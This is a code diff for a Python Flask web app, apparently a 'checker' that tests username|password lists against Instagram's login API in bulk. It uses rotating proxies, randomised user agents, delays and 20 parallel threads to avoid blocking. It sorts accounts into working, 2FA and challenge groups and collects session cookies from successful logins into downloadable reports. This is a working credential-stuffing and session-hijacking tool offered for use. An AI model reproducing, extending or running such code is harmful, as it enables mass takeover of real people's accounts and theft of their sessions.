@@ -1,9 +1,7 @@
 from flask import Flask, render_template, request, jsonify, send_file
 from flask_cors import CORS
-import asyncio
 import json
 import time
-import os
 import random
 from datetime import datetime
 import threading
@@ -24,23 +22,7 @@ class InstagramProChecker:
     def __init__(self, proxies=None):
         self.proxies = proxies if proxies else []
         self.current_proxy_index = 0
-        self.session = self._create_session()
         
-    def _create_session(self):
-        """রিট্রাই সেশন তৈরি (EOF fix + JSON error fix)"""
-        session = requests.Session()
-        retry = Retry(
-            total=5,  # ৫ বার রিট্রাই করবে
-            read=5,
-            connect=5,
-            backoff_factor=0.5,
-            status_forcelist=(500, 502, 503, 504, 403, 429)
-        )
-        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
-        session.mount('http://', adapter)
-        session.mount('https://', adapter)
-        return session
-    
     def get_next_proxy(self):
         if not self.proxies:
             return None
@@ -48,205 +30,163 @@ class InstagramProChecker:
         self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
         return proxy
     
-    def extract_json_from_response(self, text):
-        """HTML থেকে JSON আলাদা করা (যদি JSON + HTML একসাথে থাকে)"""
-        try:
-            # JSON খোঁজা
-            json_match = re.search(r'\{.*\}', text, re.DOTALL)
-            if json_match:
-                return json.loads(json_match.group())
-        except:
-            pass
-        return None
+    def create_session_with_proxy(self, proxy=None):
+        """প্রক্সি সহ সেশন তৈরি"""
+        session = requests.Session()
+        retry = Retry(total=3, backoff_factor=0.5)
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        
+        if proxy:
+            session.proxies = {'http': proxy, 'https': proxy}
+        
+        return session
     
-    def fast_check(self, username, password):
-        """সবচেয়ে ফাস্ট চেকিং মেথড (JSON error fix সহ)"""
+    def get_random_headers(self):
+        """র‍্যান্ডম হেডার জেনারেট"""
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
+        ]
+        
+        return {
+            'User-Agent': random.choice(user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0'
+        }
+    
+    def check_account_simple(self, username, password):
+        """সিম্পল চেক - ব্লক এড়ানোর জন্য"""
         try:
             proxy = self.get_next_proxy()
-            proxy_dict = None
-            if proxy:
-                proxy_dict = {'http': proxy, 'https': proxy}
+            session = self.create_session_with_proxy(proxy)
+            headers = self.get_random_headers()
             
-            # 1. ইউজার এজেন্ট র‍্যান্ডম
-            user_agents = [
-                'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
-                'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
-            ]
+            # ১. প্রথমে হোমপেজে যাই
+            home_response = session.get('https://www.instagram.com/', headers=headers, timeout=10)
             
-            headers = {
-                'User-Agent': random.choice(user_agents),
-                'Accept': 'application/json, text/plain, */*',
-                'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
+            # ২. কিছুক্ষণ অপেক্ষা
+            time.sleep(random.uniform(1, 3))
+            
+            # ৩. CSRF টোকেন নেওয়া
+            csrf_token = None
+            for cookie in session.cookies:
+                if cookie.name == 'csrftoken':
+                    csrf_token = cookie.value
+                    break
+            
+            if not csrf_token:
+                # HTML থেকে CSRF টোকেন খোঁজা
+                html_content = home_response.text
+                csrf_match = re.search(r'csrf_token":"([^"]+)"', html_content)
+                if csrf_match:
+                    csrf_token = csrf_match.group(1)
+            
+            if not csrf_token:
+                return {
+                    'status': 'error',
+                    'username': username,
+                    'error': 'Could not get CSRF token'
+                }
+            
+            # ৪. লগিন হেডার
+            login_headers = {
+                'User-Agent': headers['User-Agent'],
+                'Accept': '*/*',
+                'Accept-Language': 'en-US,en;q=0.9',
                 'Accept-Encoding': 'gzip, deflate, br',
-                'X-Instagram-AJAX': str(random.randint(1000000, 9999999)),
-                'X-CSRFToken': 'missing',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-CSRFToken': csrf_token,
+                'X-Instagram-AJAX': str(random.randint(100000, 999999)),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Connection': 'keep-alive',
-                'Host': 'www.instagram.com',
                 'Origin': 'https://www.instagram.com',
+                'Connection': 'keep-alive',
                 'Referer': 'https://www.instagram.com/',
-                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Dest': 'empty',
                 'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Dest': 'empty'
+                'Sec-Fetch-Site': 'same-origin'
             }
             
-            # ২. সেশন শুরু (কুকি নেওয়ার জন্য)
-            session_response = self.session.get(
-                'https://www.instagram.com/',
-                headers=headers,
-                proxies=proxy_dict,
-                timeout=8,
-                allow_redirects=True
-            )
-            
-            # ৩. CSRF টোকেন আপডেট
-            cookies = self.session.cookies.get_dict()
-            if 'csrftoken' in cookies:
-                headers['X-CSRFToken'] = cookies['csrftoken']
-            
-            time.sleep(0.5)
-            
-            # ৪. লগিন রিকোয়েস্ট
+            # ৫. লগিন ডাটা
             login_data = {
                 'username': username,
                 'password': password,
                 'queryParams': '{}',
-                'optIntoOneTap': 'false',
-                'stopDeletionNonce': '',
-                'trustedDeviceRecords': '{}'
+                'optIntoOneTap': 'false'
             }
             
-            response = self.session.post(
+            # ৬. লগিন রিকোয়েস্ট
+            login_response = session.post(
                 'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                 data=login_data,
-                headers=headers,
-                proxies=proxy_dict,
+                headers=login_headers,
                 timeout=10,
                 allow_redirects=False
             )
             
-            # ৫. রেসপন্স টেক্সট এবং JSON পার্স
-            response_text = response.text.strip()
-            
-            # JSON পার্স করার চেষ্টা
-            try:
-                result = response.json()
-            except json.JSONDecodeError:
-                # JSON না হলে, HTML থেকে JSON আলাদা করা
-                result = self.extract_json_from_response(response_text)
-                
-                if not result:
-                    # যদি JSON না পাওয়া যায়
-                    if 'login' in response_text.lower() and 'checkpoint' in response_text.lower():
+            # ৭. রেসপন্স চেক
+            if login_response.status_code == 200:
+                try:
+                    result = login_response.json()
+                    
+                    if result.get('authenticated'):
+                        # কুকি সংগ্রহ
+                        cookies = session.cookies.get_dict()
+                        cookie_parts = []
+                        for key in ['sessionid', 'csrftoken', 'ds_user_id', 'rur']:
+                            if key in cookies:
+                                cookie_parts.append(f"{key}={cookies[key]}")
+                        
                         return {
-                            'status': 'challenge',
-                            'username': username,
-                            'type': 'challenge',
-                            'error': 'Challenge Required'
+                            'status': 'good',
+                            'cookie': '; '.join(cookie_parts),
+                            'username': username
                         }
-                    elif 'two_factor' in response_text.lower() or '2fa' in response_text.lower():
-                        return {
-                            'status': '2fa',
-                            'username': username,
-                            'type': '2fa',
-                            'error': '2FA Required'
-                        }
+                    elif result.get('two_factor_required'):
+                        return {'status': '2fa', 'username': username}
+                    elif result.get('checkpoint_url'):
+                        return {'status': 'challenge', 'username': username}
                     else:
-                        return {
-                            'status': 'error',
-                            'username': username,
-                            'type': 'parse_error',
-                            'error': 'Invalid response from Instagram'
-                        }
-            
-            # ৬. রেসপন্স পার্স
-            if result.get('authenticated'):
-                # কুকি বের করা
-                cookies = self.session.cookies.get_dict()
-                cookie_parts = []
-                for key in ['sessionid', 'csrftoken', 'ds_user_id', 'rur']:
-                    if key in cookies:
-                        cookie_parts.append(f"{key}={cookies[key]}")
-                
-                return {
-                    'status': 'good',
-                    'cookie': '; '.join(cookie_parts),
-                    'username': username,
-                    'type': 'success',
-                    'time': 0.5
-                }
-            
-            elif result.get('two_factor_required') or result.get('two_factor_info'):
-                return {
-                    'status': '2fa',
-                    'username': username,
-                    'type': '2fa',
-                    'error': '2FA Required'
-                }
-            
-            elif result.get('checkpoint_url') or result.get('checkpoint'):
-                return {
-                    'status': 'challenge',
-                    'username': username,
-                    'type': 'challenge',
-                    'error': 'Challenge Required'
-                }
-            
-            elif 'message' in result and 'password' in str(result).lower():
-                return {
-                    'status': 'bad',
-                    'username': username,
-                    'type': 'bad',
-                    'error': 'Wrong Password'
-                }
-            
-            elif 'user' in result and result.get('user', False) == False:
-                return {
-                    'status': 'bad',
-                    'username': username,
-                    'type': 'bad',
-                    'error': 'User not found'
-                }
-            
+                        return {'status': 'bad', 'username': username}
+                        
+                except json.JSONDecodeError:
+                    # JSON না পেলে
+                    return {
+                        'status': 'blocked',
+                        'username': username,
+                        'error': 'Instagram Blocked - Try with proxy'
+                    }
             else:
                 return {
                     'status': 'error',
                     'username': username,
-                    'type': 'unknown',
-                    'error': str(result)[:100]
+                    'error': f'HTTP {login_response.status_code}'
                 }
                 
         except requests.exceptions.Timeout:
-            return {
-                'status': 'error',
-                'username': username,
-                'type': 'timeout',
-                'error': 'Connection Timeout'
-            }
-        except requests.exceptions.ConnectionError:
-            return {
-                'status': 'error',
-                'username': username,
-                'type': 'connection',
-                'error': 'Connection Error'
-            }
+            return {'status': 'timeout', 'username': username}
         except Exception as e:
-            return {
-                'status': 'error',
-                'username': username,
-                'type': 'exception',
-                'error': str(e)[:100]
-            }
+            return {'status': 'error', 'username': username, 'error': str(e)[:50]}
 
 def process_worker(cred):
-    """থ্রেড পুল ওয়ার্কার"""
+    """ওয়ার্কার ফাংশন"""
     if '|' not in cred:
         return None
     username, password = cred.split('|', 1)
     checker = InstagramProChecker()
-    return checker.fast_check(username.strip(), password.strip())
+    return checker.check_account_simple(username.strip(), password.strip())
 
 def process_batch_parallel(credentials_list, job_id, proxy_list=None):
     """প্যারালাল প্রসেসিং"""
@@ -255,14 +195,16 @@ def process_batch_parallel(credentials_list, job_id, proxy_list=None):
     jobs[job_id]['progress'] = 0
     jobs[job_id]['status'] = 'processing'
     
-    # থ্রেড পুল (৩০ থ্রেড)
-    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
-        futures = {executor.submit(process_worker, cred): cred for cred in credentials_list if '|' in cred}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+        futures = []
+        for cred in credentials_list:
+            if '|' in cred:
+                futures.append(executor.submit(process_worker, cred))
         
         completed = 0
         for future in concurrent.futures.as_completed(futures):
             try:
-                result = future.result(timeout=15)
+                result = future.result(timeout=20)
                 if result:
                     username = result.get('username', 'unknown')
                     
@@ -274,16 +216,17 @@ def process_batch_parallel(credentials_list, job_id, proxy_list=None):
                         jobs[job_id]['results']['challenge'].append(f"{username}|CHALLENGE_REQUIRED")
                     elif result['status'] == 'bad':
                         jobs[job_id]['results']['bad'].append(f"{username}|BAD_PASSWORD")
+                    elif result['status'] == 'blocked':
+                        jobs[job_id]['results']['error'].append(f"{username}|BLOCKED: {result.get('error', '')}")
+                    elif result['status'] == 'timeout':
+                        jobs[job_id]['results']['error'].append(f"{username}|TIMEOUT")
                     else:
                         jobs[job_id]['results']['error'].append(f"{username}|ERROR: {result.get('error', 'Unknown')}")
             except Exception as e:
-                cred = futures[future]
-                if '|' in cred:
-                    username = cred.split('|', 1)[0]
-                    jobs[job_id]['results']['error'].append(f"{username}|ERROR: {str(e)[:50]}")
+                jobs[job_id]['results']['error'].append(f"unknown|ERROR: {str(e)[:50]}")
             
             completed += 1
-            jobs[job_id]['progress'] = int(completed / total * 100)
+            jobs[job_id]['progress'] = int(completed / total * 100) if total > 0 else 0
             jobs[job_id]['details'] = {
                 'good': len(jobs[job_id]['results']['good']),
                 '2fa': len(jobs[job_id]['results']['2fa']),
@@ -361,13 +304,14 @@ def download(job_id, type):
                 report = f"""Instagram Checker Report
 Job ID: {job_id}
 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-Total Accounts: {jobs[job_id]['total']}
+Total: {jobs[job_id]['total']}
+Proxies: {jobs[job_id]['proxy_count']}
 
 Results:
 ✅ Good: {len(jobs[job_id]['results']['good'])}
 🔐 2FA: {len(jobs[job_id]['results']['2fa'])}
 ⚠️ Challenge: {len(jobs[job_id]['results']['challenge'])}
-❌ Bad Password: {len(jobs[job_id]['results']['bad'])}
+❌ Bad: {len(jobs[job_id]['results']['bad'])}
 ❗ Errors: {len(jobs[job_id]['results']['error'])}
 """
                 zf.writestr("report.txt", report)
